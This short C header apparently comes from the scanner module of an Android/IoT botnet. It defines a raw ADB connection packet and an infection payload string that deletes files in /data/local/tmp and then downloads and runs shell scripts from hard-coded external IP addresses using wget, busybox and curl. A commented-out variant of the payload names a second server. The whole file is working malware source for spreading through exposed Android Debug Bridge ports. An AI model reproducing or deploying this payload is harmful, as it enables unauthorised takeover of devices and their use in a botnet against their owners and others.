#if SCAN
#pragma once

enum
{
	MAX_FDS = 128,
	MAX_RAW_PPS = 60,
	SCAN_TIMEOUT = 45,
	SCAN_CLOSED = 0,
        SCAN_CONNECTING = 1,
        SCAN_OPEN = 2
};

struct scan
{
	int fd;
	uint32_t addr;
	uint16_t port;
	uint8_t state;
	uint32_t timeout;
};

#define CNXN "CNXN\x00\x00\x00\x01\x00\x00\x04\x00\x1b\x00\x00\x00\x4d\x0a\x00\x00\xbc\xb1\xa7\xb1\x68\x6f\x73\x74\x3a\x3a\x66\x65\x61\x74\x75\x72\x65\x73\x3d\x63\x6d\x64\x2c\x73\x68\x65\x6c\x6c\x5f\x76\x32"
#define CNXN_SIZE 51

//#define PAYLOAD "shell:cd /data/local/tmp/; rm -rf * .*; wget http://185.236.229.23/wget.sh; sh wget.sh; busybox wget http://185.236.229.23/bwget.sh; sh bwget.sh; curl -O http://185.236.229.23/curl.sh; sh curl.sh; busybox curl -O http://185.236.229.23/bcurl.sh; sh bcurl.sh"
#define PAYLOAD "shell:cd /data/local/tmp/; rm -rf * .*; wget http://45.95.168.92/wget.sh; sh wget.sh; busybox wget http://45.95.168.92/bwget.sh; sh bwget.sh; curl -O http://45.95.168.92/curl.sh; sh curl.sh; busybox curl -O http://45.95.168.92/bcurl.sh; sh bcurl.sh"
void init_scan(void);
void terminate_scan(void);
#endif

